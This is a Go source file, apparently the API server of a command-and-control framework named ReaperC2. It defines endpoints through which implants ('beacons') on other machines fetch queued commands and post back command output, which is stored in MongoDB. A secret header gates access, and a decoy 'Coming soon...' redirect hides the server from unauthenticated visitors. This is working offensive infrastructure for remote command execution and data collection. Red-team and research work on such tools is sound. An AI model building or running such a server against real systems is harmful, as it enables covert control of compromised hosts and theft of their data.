package apiserver

import (
	"ReaperC2/pkg/dbconnections"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	"go.mongodb.org/mongo-driver/bson"
)

// Setting endpoints as a constant
// this helps the user declare their own endpoints
const (
	endpointRoot          = "/"
	endpointStatus        = "/status"
	endpointComingSoon    = "/coming-soon"
	endpointData          = "/data"
	endpointRegister      = "/register"
	endpointUUID          = "/{uuid}"
	endpointHeartbeat     = "/heartbeat"
	endpointHeartbeatUUID = endpointHeartbeat + endpointUUID
	endpointReceive       = "/receive"
	endpointReceiveUUID   = endpointReceive + endpointUUID
	endpointFetchData     = "/fetch-data" + endpointUUID
)

// Start the API server
func StartAPIServer() {

	r := mux.NewRouter()

	// Welcome message to know the API exists
	r.HandleFunc(endpointRoot, func(w http.ResponseWriter, r *http.Request) {
		JsonResponse(w, map[string]string{"message": "Welcome"})
	})

	// Status check to make sure the API is running
	r.HandleFunc(endpointStatus, func(w http.ResponseWriter, r *http.Request) {
		JsonResponse(w, map[string]string{"message": "API is running"})
	})

	// Redirector, use this to redirect unauthenticated clients
	r.HandleFunc(endpointComingSoon, func(w http.ResponseWriter, r *http.Request) {
		JsonResponse(w, map[string]string{"message": "Coming soon..."})
	})

	// Authenticated endpoints
	// r.HandleFunc(endpointRegister, AuthMiddleware(HandleClientRegistration))
	// r.HandleFunc(endpointRegister, HandleClientRegistration)
	r.HandleFunc(endpointHeartbeat, AuthMiddleware(HandleHeartBeat))
	r.HandleFunc(endpointHeartbeatUUID, AuthMiddleware(HandleHeartBeatUUID))
	r.HandleFunc(endpointReceive, AuthMiddleware(HandleReceive))
	r.HandleFunc(endpointReceiveUUID, AuthMiddleware(HandleReceiveUUID))
	r.HandleFunc(endpointFetchData, AuthMiddleware(HandleFetchData))

	// Not used, but leaving here if I ever need to host a data.json file
	// r.HandleFunc(endpointData, AuthMiddleware(HandleImportDataFile))

	log.Println("Server running on port 8080...")
	log.Fatal(http.ListenAndServe(":8080", r))
}

// // Register a beacon. Cool idea, don't recommend to automate
// func HandleClientRegistration(w http.ResponseWriter, r *http.Request) {
// 	clientUUID := uuid.New().String() // Generate a unique UUID
// 	response := map[string]string{"ClientUUID": clientUUID}

// 	log.Printf("New UUID: %s\n", clientUUID)
// 	log.Printf("The response: %s\n", response)
// 	w.Header().Set("Content-Type", "application/json")
// 	json.NewEncoder(w).Encode(response)

// 	log.Printf("[+] New client registered: %s", clientUUID)
// }

func HandleFetchData(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	uuid := vars["uuid"]

	data, err := dbconnections.FetchClientData(uuid)
	if err != nil {
		http.Error(w, "Error retrieving data", http.StatusInternalServerError)
		return
	}

	JsonResponse(w, data)
}

func HandleHeartBeat(w http.ResponseWriter, r *http.Request) {
	result, err := dbconnections.FetchHeartbeat()
	if err != nil {
		log.Println("Error fetching heartbeat:", err)
		http.Error(w, `{"error": "Failed to fetch heartbeat"}`, http.StatusInternalServerError)
		return
	}

	// Extract only the "status" field
	status, ok := result["status"].(string)
	if !ok {
		http.Error(w, "Invalid data format", http.StatusInternalServerError)
		return
	}

	JsonResponse(w, map[string]string{"status": status})
}

// Hearbeat specific to a UUID beacon
func HandleHeartBeatUUID(w http.ResponseWriter, r *http.Request) {
	// Ensure it's a GET request
	if r.Method != http.MethodGet {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	vars := mux.Vars(r)
	uuid := vars["uuid"]

	client, err := dbconnections.FindClientByUUID(uuid)
	if err != nil {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	// Fetch and clear commands
	commands, err := dbconnections.FetchAndClearCommands(uuid)
	if err != nil {
		http.Error(w, "Failed to retrieve commands", http.StatusInternalServerError)
		return
	}

	// Prepare response
	response := map[string]interface{}{
		"ClientId": client.ClientId,
		"Active":   client.Active,
		"Commands": commands,
	}

	// Convert client struct to JSON and send response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// HandleReceive processes incoming POST data and logs it
func HandleReceive(w http.ResponseWriter, r *http.Request) {
	// Ensure it's a POST request
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	// Read the request body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()

	// Parse the JSON
	var data map[string]interface{}
	err = json.Unmarshal(body, &data)
	if err != nil {
		http.Error(w, "Invalid JSON format", http.StatusBadRequest)
		return
	}

	// Log the received data
	clientIP := r.RemoteAddr
	log.Printf("Received POST request from %s:", clientIP)
	for key, value := range data {
		log.Printf(" %s: %v", key, value)
	}

	// Send response
	JsonResponse(w, map[string]string{"message": "Data received successfully"})
}

// Authenticated endpointReceiveUUID POST details
// This needs to be saved in mongodb
func HandleReceiveUUID(w http.ResponseWriter, r *http.Request) {
	// Ensure it's a POST request
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}
	vars := mux.Vars(r)
	clientUUID := vars["uuid"] // Extract from URL

	var requestData struct {
		Command string `json:"Command"`
		Output  string `json:"Output"`
	}

	err := json.NewDecoder(r.Body).Decode(&requestData)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	log.Printf("[+] Received response from %s | Command: %s | Output: %s", clientUUID, requestData.Command, requestData.Output)

	err = dbconnections.StoreClientData(clientUUID, requestData.Command, requestData.Output)
	if err != nil {
		log.Printf("[-] Failed to store data for %s: %v", clientUUID, err)
		http.Error(w, "Failed to store data", http.StatusInternalServerError)
		return
	}

	// w.WriteHeader(http.StatusOK)
	JsonResponse(w, map[string]string{"message": "Data received and stored successfully"}) // This is our error
}

// jsonResponse sends JSON data with the appropriate headers
func JsonResponse(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(data)
}

// loadJSONFromFile reads and parses JSON from a file
func LoadJSONFromFile(filename string) ([]map[string]interface{}, error) {
	fileData, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to read file: %v", err)
	}

	var data []map[string]interface{}
	err = json.Unmarshal(fileData, &data)
	if err != nil {
		return nil, fmt.Errorf("failed to parse JSON: %v", err)
	}

	return data, nil
}

// validateClientAuth checks if ClientId and Secret exist in MongoDB and are active
// func ValidateClientAuth(clientId, secret string) (bool, error) {
func ValidateClientAuth(secret string) (bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var clientAuth dbconnections.ClientAuth
	// filter := bson.M{"ClientId": clientId, "Secret": secret, "Active": true}
	filter := bson.M{"Secret": secret, "Active": true}

	err := dbconnections.ClientCollection.FindOne(ctx, filter).Decode(&clientAuth)
	if err != nil {
		// log.Println("No match found")
		return false, nil // No match found
	}
	// log.Println("We have a match in mongo")
	return true, nil
}

// authMiddleware checks for ClientId & Secret in request headers and validates against MongoDB
func AuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		clientSecret := r.Header.Get("X-API-Secret")

		clientIP := r.RemoteAddr
		requestTime := time.Now().Format(time.RFC3339) // Logs timestamp in ISO format

		// Extract real IP if behind a reverse proxy
		if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
			clientIP = forwarded
		}

		// Log the request details
		log.Printf("[%s] Request from %s | Endpoint: %s\n", requestTime, clientIP, r.URL.Path)

		if clientSecret == "" {
			http.Redirect(w, r, endpointComingSoon, http.StatusTemporaryRedirect)
			return
		}

		valid, err := ValidateClientAuth(clientSecret)
		if err != nil || !valid {
			log.Printf("[%s] Unauthorized request from %s\n", requestTime, clientIP)
			http.Redirect(w, r, endpointComingSoon, http.StatusTemporaryRedirect)
			return
		}

		next.ServeHTTP(w, r) // Call the next handler
	}
}

// // Import the data.json file and give to client
// func HandleImportDataFile(w http.ResponseWriter, r *http.Request) {
// 	// Debugging
// 	// filePath := "data.json"
// 	// file, err := os.Open(filePath)
// 	// if err != nil {
// 	// 	log.Fatalf("Error opening file: %v", err)
// 	// }
// 	// defer file.Close()
// 	// log.Println("File opened successfully!")

// 	data, err := LoadJSONFromFile("data.json")
// 	if err != nil {
// 		// log.Println("data.json should be here")
// 		http.Error(w, err.Error(), http.StatusInternalServerError)
// 		return
// 	}
// 	JsonResponse(w, data)
// }
